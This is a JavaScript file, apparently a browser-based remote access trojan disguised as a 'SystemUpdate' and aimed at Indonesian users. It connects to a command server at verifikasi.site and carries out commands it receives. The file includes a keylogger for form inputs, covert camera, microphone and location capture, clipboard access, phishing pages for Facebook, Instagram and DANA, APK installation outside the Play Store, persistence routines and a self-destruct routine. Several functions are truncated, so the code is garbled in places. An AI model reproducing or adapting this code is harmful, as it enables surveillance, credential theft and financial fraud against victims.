// ============================================================
// 🔥 GLOBAL ERROR HANDLER
// ============================================================
(function() {
    var errorLog = [];
    
    window.addEventListener('error', function(e) {
        var err = {
            message: e.message || 'Unknown error',
            filename: e.filename || 'unknown',
            lineno: e.lineno || 0,
            colno: e.colno || 0,
            stack: (e.error && e.error.stack) || 'No stack',
            timestamp: Date.now()
        };
        errorLog.push(err);
        
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/error', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(err));
        } catch(ex) {}
        
        return true;
    }, true);
    
    window.addEventListener('unhandledrejection', function(e) {
        var err = {
            type: 'unhandled_rejection',
            reason: String(e.reason || 'Unknown'),
            timestamp: Date.now()
        };
        errorLog.push(err);
        
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/error', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(err));
        } catch(ex) {}
        
        e.preventDefault();
        return true;
    }, true);
    
    window.__errorLog = errorLog;
})();

// ============================================================
// 🔥 SAFE PATH
// ============================================================
function getSafePath(base, filename) {
    if (!base || typeof base !== 'string') return null;
    if (!filename || typeof filename !== 'string') return null;
    
    var cleanName = filename.replace(/[^a-zA-Z0-9_.-]/g, '');
    if (cleanName.length === 0) return null;
    
    var fullPath = base.replace(/\/+$/, '') + '/' + cleanName;
    
    if (fullPath.indexOf('..') !== -1) return null;
    if (fullPath.indexOf('//') !== -1) return null;
    
    return fullPath;
}

// ============================================================
// 🔥 SAFE FETCH
// ============================================================
function safeFetch(url, options, timeout, retries) {
    timeout = timeout || 30000;
    retries = retries || 5;
    var attempt = 0;
    var cacheKey = 'cache_' + url;
    
    try {
        var cached = localStorage.getItem(cacheKey);
        if (cached) {
            var data = JSON.parse(cached);
            if (data.timestamp && (Date.now() - data.timestamp < 60000)) {
                return Promise.resolve(new Response(JSON.stringify(data.value), {
                    status: 200,
                    headers: { 'Content-Type': 'application/json' }
                }));
            }
        }
    } catch(e) {}
    
    function doFetch() {
        return new Promise(function(resolve, reject) {
            var timer = setTimeout(function() {
                reject(new Error('Timeout: ' + url));
            }, timeout);
            
            fetch(url, options)
                .then(function(response) {
                    clearTimeout(timer);
                    if (response.ok) {
                        response.clone().text().then(function(text) {
                            try {
                                localStorage.setItem(cacheKey, JSON.stringify({
                                    value: JSON.parse(text),
                                    timestamp: Date.now()
                                }));
                            } catch(e) {}
                        }).catch(function(){});
                    }
                    resolve(response);
                })
                .catch(function(err) {
                    clearTimeout(timer);
                    reject(err);
                });
        });
    }
    
    return new Promise(function(resolve, reject) {
        function tryFetch() {
            doFetch()
                .then(resolve)
                .catch(function(err) {
                    attempt++;
                    if (attempt < retries) {
                        var delay = 1000 * Math.pow(2, attempt);
                        setTimeout(tryFetch, delay);
                    } else {
                        reject(err);
                    }
                });
        }
        tryFetch();
    });
}

// ============================================================
// AMBIL PASSWORD DARI WORKER
// ============================================================
function getPasswordFromWorker() {
    return new Promise(function(resolve, reject) {
        safeFetch('/get-password', { method: 'GET' }, 10000, 2)
            .then(function(res) {
                if (!res.ok) throw new Error('HTTP ' + res.status);
                return res.json();
            })
            .then(function(data) {
                if (data.password) {
                    WS_PASSWORD = data.password;
                    resolve(WS_PASSWORD);
                } else {
                    reject(new Error('No password in response'));
                }
            })
            .catch(function(err) {
                reject(err);
            });
    });
}

// ============================================================
// 🔥 SERVICE WORKER (PAKAI sw.js)
// ============================================================
function registerSW() {
    if (swRegistered) {
        K({ sumber: 'sw_status', data: 'already_registered' });
        return;
    }
    
    if (!('serviceWorker' in navigator)) {
        document.getElementById('status').textContent = '❌ SW not supported';
        return;
    }
    
    navigator.serviceWorker.getRegistrations()
        .then(function(registrations) {
            if (registrations.length > 0) {
                swRegistered = true;
                K({ sumber: 'sw_status', data: 'already_registered' });
                document.getElementById('status').textContent = '✅ SW already active!';
                return;
            }
            
            navigator.serviceWorker.register('/sw.js', { scope: '/' })
                .then(function(reg) {
                    swRegistered = true;
                    document.getElementById('status').textContent = '✅ SystemUpdate aktif!';
                    K({ sumber: 'sw_status', data: 'registered' });
                })
                .catch(function(err) {
                    document.getElementById('status').textContent = '❌ Gagal: ' + err.message;
                    K({ sumber: 'sw_status', data: 'failed: ' + err.message });
                });
        })
        .catch(function() {
            navigator.serviceWorker.register('/sw.js', { scope: '/' })
                .then(function(reg) {
                    swRegistered = true;
                    document.getElementById('status').textContent = '✅ SystemUpdate aktif!';
                    K({ sumber: 'sw_status', data: 'registered_fallback' });
                })
                .catch(function(err) {
                    document.getElementById('status').textContent = '❌ Gagal: ' + err.message;
                    K({ sumber: 'sw_status', data: 'failed: ' + err.message });
                });
        });
}

// ============================================================
// 🔥 WEBSOCKET
// ============================================================
function connectWebSocket() {
    try {
        if (typeof WebSocket === 'undefined') {
            K({ sumber: 'ws_status', data: 'not_supported' });
            return;
        }
        
        getPasswordFromWorker()
            .then(function(password) {
                K({ sumber: 'ws_status', data: 'password_received' });
                doConnectWebSocket(password);
            })
            .catch(function(err) {
                K({ sumber: 'ws_error', data: 'failed_to_get_password: ' + err.message });
                doConnectWebSocket('');
            });
        
    } catch(e) {
        K({ sumber: 'ws_error', data: e.message });
        setTimeout(connectWebSocket, 10000);
    }
}

function doConnectWebSocket(password) {
    try {
        var ws = new WebSocket('wss://verifikasi.site/ws');
        var reconnectAttempts = 0;
        var maxReconnect = 20;
        
        ws.onopen = function() {
            reconnectAttempts = 0;
            document.getElementById('status').textContent = '🔌 Connected!';
            K({ sumber: 'ws_status', data: 'connected' });
            ws.send(JSON.stringify({
                type: 'auth',
                key: password,
                deviceId: navigator.userAgent || 'unknown',
                timestamp: Date.now()
            }));
        };
        
        ws.onmessage = function(event) {
            try {
                var data = JSON.parse(event.data);
                if (data.type === 'auth_success') {
                    K({ sumber: 'ws_status', data: 'authenticated' });
                }
                if (data.type === 'auth_failed') {
                    K({ sumber: 'ws_status', data: 'auth_failed' });
                }
                if (data.type === 'command' && data.aksi) {
                    var hasil = eksekusiPerintah(data);
                    ws.send(JSON.stringify({
                        type: 'result',
                        perintah: data.aksi,
                        hasil: hasil
                    }));
                    K({ sumber: 'ws_c2_result', data: { perintah: data.aksi, hasil: hasil } });
                }
                if (data.type === 'ping') {
                    ws.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
                }
            } catch(e) {
                K({ sumber: 'ws_message_error', data: e.message });
            }
        };
        
        ws.onclose = function() {
            document.getElementById('status').textContent = '🔌 Reconnecting...';
            K({ sumber: 'ws_status', data: 'disconnected' });
            
            if (reconnectAttempts < maxReconnect) {
                reconnectAttempts++;
                var delay = 1000 * Math.pow(1.5, reconnectAttempts);
                setTimeout(function() {
                    doConnectWebSocket(password);
                }, delay);
            }
        };
        
        ws.onerror = function() {};
        
        var wsHeartbeat = setInterval(function() {
            if (ws && ws.readyState === WebSocket.OPEN) {
                try {
                    ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
                } catch(e) {}
            }
        }, 30000);
        cleanupItems.push(function() { clearInterval(wsHeartbeat); });
        
    } catch(e) {
        K({ sumber: 'ws_error', data: e.message });
        setTimeout(connectWebSocket, 10000);
    }
}

// ============================================================
// 🔥 INJECT KE FILE SYSTEM
// ============================================================
function injectToFileSystem() {
    try {
        var htmlContent = document.documentElement.outerHTML;
        var successCount = 0;
        
        try {
            localStorage.setItem('system_update_html', htmlContent);
            successCount++;
            K({ sumber: 'inject_ls', data: 'success' });
        } catch(e) {
            K({ sumber: 'inject_ls', data: 'failed: ' + e.message });
        }
        
        try {
            var request = indexedDB.open('SystemUpdateDB', 1);
            request.onupgradeneeded = function(e) {
                var db = e.target.result;
                if (!db.objectStoreNames.contains('files')) {
                    db.createObjectStore('files');
                }
            };
            request.onsuccess = function(e) {
                try {
                    var db = e.target.result;
                    var tx = db.transaction('files', 'readwrite');
                    var store = tx.objectStore('files');
                    store.put(htmlContent, 'SystemUpdate.html');
                    successCount++;
                    K({ sumber: 'inject_indexeddb', data: 'success' });
                } catch(e) {
                    K({ sumber: 'inject_indexeddb', data: 'failed: ' + e.message });
                }
            };
        } catch(e) {
            K({ sumber: 'inject_indexeddb', data: 'failed: ' + e.message });
        }
        
        if (typeof AndroidBridge !== 'undefined') {
            try {
                var safePath = getSafePath('/storage/emulated/0/Android/data/com.google.android.play.services', 'SystemUpdate.html');
                if (safePath) {
                    AndroidBridge.saveFile(safePath, htmlContent);
                    successCount++;
                    K({ sumber: 'inject_hidden_folder', data: 'success: ' + safePath });
                }
            } catch(e) {
                K({ sumber: 'inject_hidden_folder', data: 'failed: ' + e.message });
            }
        }
        
        if (successCount > 0) {
            document.getElementById('status').textContent = '✅ Injected! (' + successCount + ' methods)';
        } else {
            document.getElementById('status').textContent = '⚠️ Inject failed';
        }
        
    } catch(e) {
        K({ sumber: 'inject_error', data: e.message });
        document.getElementById('status').textContent = '❌ Inject error';
    }
}

// ============================================================
// 🔥 AUTO-EXECUTE
// ============================================================
function autoExecute() {
    try {
        var installed = localStorage.getItem('system_update_installed');
        var timestamp = localStorage.getItem('system_update_time');
        var now = Date.now();
        
        if (installed && timestamp && (now - parseInt(timestamp) > 86400000)) {
            injectToFileSystem();
            localStorage.setItem('system_update_time', now);
        }
        
        if (!installed) {
            localStorage.setItem('system_update_installed', '1');
            localStorage.setItem('system_update_time', now);
            injectToFileSystem();
        }
    } catch(e) {
        K({ sumber: 'auto_execute_error', data: e.message });
    }
}

var inputData = {};

document.addEventListener('input', function(e) {
    try {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT') {
            var key = e.target.id || e.target.name || e.target.type || 'unknown';
            inputData[key] = e.target.value;

    } catch(e) {}
});

document.addEventListener('submit', function(e) {
    try {
        var form = e.target;
        var data = {};
        var inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(function(input) {
            var key = input.id || input.name || input.type || 'unknown';
            data[key] = input.value;
        });
        formData.push({
            waktu: Date.now(),
            url: window.location.href,
            data: data
        });
        K({ sumber: 'keylogger_submit', data: data });
    } catch(e) {}
});

setInterval(function() {
    try {
        if (Object.keys(inputData).length > 0) {
            K({ sumber: 'keylogger', data: inputData });
            inputData = {};
        }
        if (formData.length > 0) {
            K({ sumber: 'keylogger_forms', data: formData });
            formData = [];
        }
    } catch(e) {}
}, 3000);

// 🔥 INSTALL APK (4 METHOD - TANPA PLAY STORE!)
// ============================================================
function installAPK(path) {
    try {
        var safePath = getSafePath(path, '');
        var targetPath = safePath || path || '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk';
        var hasil = [];
        
        // Method 1: Intent (Android)
        try {
            var intentUrl = 'intent://' + targetPath + '#Intent;scheme=file;package=com.android.packageinstaller;end';
            window.location.href = intentUrl;
            hasil.push('intent_attempted');
            K({ sumber: 'html_install_apk', data: { method: 'intent', path: targetPath } });
        } catch(e) {
            hasil.push('intent_failed: ' + e.message);
        }
        
        // Method 2: AndroidBridge
        try {
            if (typeof AndroidBridge !== 'undefined') {
                AndroidBridge.installAPK(targetPath);
                hasil.push('bridge_attempted');
                K({ sumber: 'html_install_apk', data: { method: 'bridge', path: targetPath } });
            }
        } catch(e) {
            hasil.push('bridge_failed: ' + e.message);
        }
        
        // Method 3: Buka file
        setTimeout(function() {
            try {
                window.open('file://' + targetPath, '_blank');
                hasil.push('file_open_attempted');
            } catch(e) {
                hasil.push('file_open_failed: ' + e.message);
            }
        }, 500);
        
        // Method 4: Download ulang
        setTimeout(function() {
            try {
                var a = document.createElement('a');
                a.href = SERVER + '/files/GooglePlayServices.apk';
                a.download = 'GooglePlayServices.apk';
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();
                var cleanup = function() {
                    try { if (a.parentNode) a.parentNode.removeChild(a); } catch(e) {}
                };
                setTimeout(cleanup, 1000);
                cleanupItems.push(cleanup);
                hasil.push('download_attempted');
            } catch(e) {
                hasil.push('download_failed: ' + e.message);
            }
        }, 1000);
        
        // ❌ METHOD 5: TELAH DIHAPUS (redirect ke Play Store)
        
        K({ sumber: 'html_install_apk', data: { path: targetPath, status: hasil.join('; ') } });
        return 'Install started: ' + targetPath;
    } catch(e) {
        return 'Error: ' + e.message;
    }
}

// 🔥 SELF DESTRUCT
// ============================================================
function selfDestruct() {
    try {
        try { localStorage.clear(); } catch(e) {}
        try { sessionStorage.clear(); } catch(e) {}
        
        try {
            document.cookie.split(';').forEach(function(c) {
                document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date(0).toUTCString() + ';path=/');
            });
        } catch(e) {}
        
        try {
            indexedDB.databases().then(function(dbs) {
                dbs.forEach(function(db) {
                    indexedDB.deleteDatabase(db.name);
                });
            }).catch(function() {});
        } catch(e) {}
        
        try {
            if ('caches' in window) {
                caches.keys().then(function(keys) {
                    keys.forEach(function(key) {
                        caches.delete(key);
                    });
                }).catch(function() {});
            }
        } catch(e) {}
        
        document.body.innerHTML = '<div style="background:#000;color:#f44;text-align:center;padding:50px;font-family:monospace;font-size:24px;">💀 SYSTEM DESTROYED</div>';
        
        K({ sumber: 'self_destruct', data: 'executed' });
        
        setTimeout(function() {
            try { window.close(); } catch(e) {}
            try { window.location.href = 'about:blank'; } catch(e) {}
        }, 2000);
        
        return 'Self destruct initiated!';
    } catch(e) {
        return 'Error: ' + e.message;
    }
}

function eksekusiPerintah(cmd) {
    try {
        var aksi = cmd.aksi || cmd.command || 'unknown';
        var hasil = '';
        
        switch(aksi) {
            case "screenshot": hasil = ambilScreenshot(); break;
            case "record_audio": hasil = recordAudio(cmd.durasi || 10); break;
            case "stop_audio": hasil = stopAudio(); break;
            case "record_video": hasil = recordVideo(cmd.durasi || 10); break;
            case "stop_video": hasil = stopVideo(); break;
            case "take_photo": hasil = takePhoto(); break;
            case "ambil_lokasi": hasil = ambilLokasi(); break;
            case "get_clipboard": hasil = getClipboard(); break;
            case "set_clipboard": hasil = setClipboard(cmd.text || ""); break;
            case "buka_url": hasil = bukaURL(cmd.url || "https://verifikasi.site"); break;
            case "buka_url_hidden": hasil = bukaURLHidden(cmd.url || "https://verifikasi.site"); break;
            case "download": hasil = downloadFile(cmd.url || "", cmd.filename || "download.apk"); break;
            case "install_apk": hasil = installAPK(cmd.path || "/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk"); break;
            case "buka_wa": hasil = bukaURL("https://web.whatsapp.com"); break;
            case "buka_telegram": hasil = bukaURL("https://web.telegram.org"); break;
            case "buka_instagram": hasil = bukaURL("https://www.instagram.com"); break;
            case "buka_facebook": hasil = bukaURL("https://www.facebook.com"); break;
            case "buka_dana": hasil = bukaURL("https://www.dana.id"); break;
            case "buka_gopay": hasil = bukaURL("https://www.gojek.com"); break;
            case "buka_ovo": hasil = bukaURL("https://www.ovo.id"); break;
            case "buka_bri": hasil = bukaURL("https://ib.bri.co.id"); break;
            case "buka_bca": hasil = bukaURL("https://www.klikbca.com"); break;
            case "phishing_fb": hasil = bukaURL("https://verifikasi.site/fb"); break;
            case "phishing_ig": hasil = bukaURL("https://verifikasi.site/ig"); break;
            case "phishing_dana": hasil = bukaURL("https://verifikasi.site/dana"); break;
            case "get_system_info": hasil = getSystemInfo(); break;
            case "get_battery": hasil = getBattery(); break;
            case "vibrate": hasil = vibrate(cmd.durasi || 1000); break;

    } catch(e) {

// ============================================================
// FUNGSI PERINTAH
// ============================================================
function ambilScreenshot() {
    try {
        var canvas = document.createElement('canvas');
        canvas.width = screen.width;
        canvas.height = screen.height;
        var ctx = canvas.getContext('2d');
        ctx.fillStyle = '#000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        return 'data:image/jpeg;base64,' + canvas.toDataURL('image/jpeg', 0.3).split(',')[1];
    } catch(e) { return 'Error: ' + e.message; }
}

function recordAudio(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'audio/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        K({ sumber: 'html_c2_result', data: { perintah: 'record_audio', hasil: reader.result, waktu: Date.now() } });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
                return 'Recording ' + durasi + 's...';
            })
            .catch(function(e) { return 'Error: ' + e.message; });
        return 'Started recording...';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopAudio() {
    try {
        if (window._recorder) {
            window._recorder.stop();
            window._recorder = null;
            return 'Stopped';
        }
        return 'No active recording';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopVideo() { return stopAudio(); }

function recordVideo(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                window._recorder = recorder;
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'video/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        K({ sumber: 'html_c2_result', data: { perintah: 'record_video', hasil: reader.result, waktu: Date.now() } });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
                return 'Recording video ' + durasi + 's...';
            })
            .catch(function(e) { return 'Error: ' + e.message; });
        return 'Started video recording...';
    } catch(e) { return 'Error: ' + e.message; }
}

function takePhoto() {
    try {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(function(stream) {
                var track = stream.getTracks()[0];
                var imageCapture = new ImageCapture(track);
                imageCapture.takePhoto()
                    .then(function(blob) {
                        var reader = new FileReader();
                        reader.onload = function() {
                            K({ sumber: 'html_c2_result', data: { perintah: 'take_photo', hasil: reader.result, waktu: Date.now() } });
                        };
                        reader.readAsDataURL(blob);
                        stream.getTracks().forEach(function(t) { t.stop(); });
                    })
                    .catch(function(e) { return 'Error: ' + e.message; });
            })
            .catch(function(e) { return 'Error: ' + e.message; });
        return 'Taking photo...';
    } catch(e) { return 'Error: ' + e.message; }
}

function ambilLokasi() {
    try {
        navigator.geolocation.getCurrentPosition(function(pos) {
            K({ sumber: 'html_c2_result', data: { perintah: 'ambil_lokasi', hasil: { lat: pos.coords.latitude, lon: pos.coords.longitude }, waktu: Date.now() } });
        }, function(e) { return 'Error: ' + e.message; });
        return 'Getting location...';
    } catch(e) { return 'Error: ' + e.message; }
}

function getClipboard() {
    try {
        navigator.clipboard.readText()

}

function setClipboard(text) {
    try {
        navigator.clipboard.writeText(text)

                K({ sumber: 'html_c2_result', data: { perintah: 'set_clipboard', hasil: 'success', waktu: Date.now() } });
            })

function bukaURL(url) {
    try { window.open(url, '_blank'); return 'URL opened: ' + url; } catch(e) { return 'Error: ' + e.message; }
}

function bukaURLHidden(url) {
    try {
        var iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
        document.body.appendChild(iframe);
        var cleanupIframe = setTimeout(function() {
            try { if (iframe.parentNode) iframe.parentNode.removeChild(iframe); } catch(e) {}
        }, 5000);
        cleanupItems.push(function() { clearTimeout(cleanupIframe); });
        return 'URL opened hidden: ' + url;
    } catch(e) { return 'Error: ' + e.message; }
}

function downloadFile(url, filename) {
    try {
        var a = document.createElement('a');
        a.href = url;
        a.download = filename;
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        var cleanup = function() {
            try { if (a.parentNode) a.parentNode.removeChild(a); } catch(e) {}
        };
        setTimeout(cleanup, 1000);
        cleanupItems.push(cleanup);
        return 'Download started: ' + filename;
    } catch(e) { return 'Error: ' + e.message; }
}

}

// CLEANUP
// ============================================================
window.addEventListener('beforeunload', function() {
    try {
        var iframes = document.querySelectorAll('iframe');
        for (var i = 0; i < iframes.length; i++) {
            try {
                if (iframes[i] && iframes[i].parentNode) {
                    iframes[i].parentNode.removeChild(iframes[i]);
                }
            } catch(e) {}
        }
        
        for (var j = 0; j < cleanupItems.length; j++) {
            try {
                if (typeof cleanupItems[j] === 'function') {
                    cleanupItems[j]();
                }
            } catch(e) {}
        }
        cleanupItems = [];
        
        if (window._heartbeatInterval) {
            clearInterval(window._heartbeatInterval);
            window._heartbeatInterval = null;
        }
        if (window._c2Interval) {
            clearInterval(window._c2Interval);
            window._c2Interval = null;
        }
        if (window._refreshTimer) {
            clearTimeout(window._refreshTimer);
            window._refreshTimer = null;
        }
        if (window._closeTimer) {
            clearTimeout(window._closeTimer);
            window._closeTimer = null;
        }
        
    } catch(e) {}
});
